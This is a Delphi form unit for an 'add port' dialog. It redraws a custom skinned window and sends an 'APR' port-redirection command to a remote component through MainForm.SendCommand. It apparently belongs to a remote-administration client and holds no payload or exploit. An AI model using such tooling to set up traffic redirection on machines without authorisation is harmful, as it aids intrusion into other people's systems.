unit AddPortUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, OutlookBtn, TFlatEditUnit;

type
  TAddPort = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    Label1: TLabel;
    FlatEdit1: TFlatEdit;
    FlatEdit2: TFlatEdit;
    FlatEdit3: TFlatEdit;
    OutlookBtn1: TOutlookBtn;
    OutlookBtn2: TOutlookBtn;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    procedure SetTheColors;
  end;

var
  AddPort: TAddPort;

implementation

uses Unit1, MainUnit;

{$R *.DFM}

procedure TAddPort.SetTheColors;
begin
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 Label1.Font.Color:=cFormText;
 Label1.Color:=cFormBackground;
 with FlatEdit1 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit2 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit3 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 Invalidate; 
end;

procedure TAddPort.FormCreate(Sender: TObject);
begin
 SetTheColors;
end;

procedure TAddPort.CloseButtonClick(Sender: TObject);
begin
 close;
end;

procedure TAddPort.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TAddPort.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TAddPort.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TAddPort.OutlookBtn2Click(Sender: TObject);
begin
 close;
end;

procedure TAddPort.OutlookBtn1Click(Sender: TObject);
begin
 With MainForm.PortList.Items.Add do
  begin
   Caption:=FlatEdit1.Text;
   SubItems.Add(FlatEdit2.Text);
   SubItems.Add(FlatEdit3.Text);
  end;
 MainForm.SendCommand('APR'+FlatEdit1.Text+'$$$'+FlatEdit2.Text+'???'+FlatEdit3.Text,'enableing port redirection...','2.1');
 close;
end;

procedure TAddPort.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TAddPort.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
